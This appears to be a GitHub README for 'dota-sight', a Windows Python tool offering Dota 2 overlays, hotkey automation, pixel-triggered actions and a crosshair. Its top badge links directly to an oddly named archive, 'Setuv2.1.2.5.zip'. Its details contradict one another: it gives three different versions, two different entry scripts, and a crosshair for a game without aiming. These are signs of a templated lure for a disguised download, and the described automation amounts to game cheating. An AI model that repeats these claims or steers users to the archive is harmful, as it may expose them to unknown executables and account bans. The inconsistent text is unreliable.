[![Release](https://img.shields.io/badge/Release-Stable-success?style=for-the-badge&logo=github)](https://github.com/john-sonhq2004g6/dota-sight/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 🎮 dota-sight

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.2-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/john-sonhq2004g6/dota-sight?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/john-sonhq2004g6/dota-sight?style=flat-square)

Dota 2 assistant: hotkeys, overlays, & performance stats

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

### Config

Configuration is handled via `config.yaml`. Here's a sample:

```yaml
port: 5555
debug: False
overlay:
 enabled: True
 color: [255, 0, 0]
analyzer:
 threshold: 0.8
 path: "C:\\path\\to\\your\\dota\\replays"
hotkeys:
 ability_1: "Q"
 ability_2: "W"
 # ... more hotkeys
```

### Requirements

Make sure you have Python 3.11+ installed. You'll also need the following Python packages. Install them with:

```bash
pip install -r requirements.txt
```

This project uses:

* `opencv-python` for screen analysis
* `pyyaml` for configuration
* `pynput` for hotkey handling
* `psutil` for performance stats

### Features

* **Screen analysis**: Analyzes your screen for specific events.
* **Overlay**: Displays an in-game overlay with useful info.
* **Crosshair**: Custom crosshair for better aiming.
* **Pixel detection**: Detects specific pixels and triggers actions.
* **Hotkey automation**: Automates actions based on hotkey presses.
* **Configuration**: Easily configure settings via a YAML file.

### How to Use

To run the assistant:

```bash
python engine.py
```

This will start the main application. Check `config.yaml` to tweak settings.

### FAQ

<details>
 <summary>Why is the overlay not showing up?</summary>
 Make sure the overlay is enabled in `config.yaml` (`overlay.enabled: True`). Also, Dota 2 needs to be running in borderless windowed mode or windowed mode.
</details>

<details>
 <summary>How do I change the hotkeys?</summary>
 Edit the `hotkeys` section in `config.yaml`. The keys should match the names recognized by `pynput.keyboard.Key`.
</details>

<details>
 <summary>Where are the logs stored?</summary>
 Logs are stored in the `logs/` directory.
</details>

### Troubleshooting

* **Problem**: Application crashes on startup.
 * **Solution**: Double-check your `config.yaml` for errors. Make sure all paths are correct.
* **Problem**: Hotkeys aren't working.
 * **Solution**: Ensure the application has the necessary permissions to listen for keyboard input. On Windows, you might need to run it as administrator.
* **Problem**: Performance issues.
 * **Solution**: Try reducing the `analyzer.threshold` value in `config.yaml`. Also, close other CPU/GPU intensive applications.

TODO: Add a section on how to debug pixel detection. WIP.

---

Contributions are welcome! Feel free to open a PR.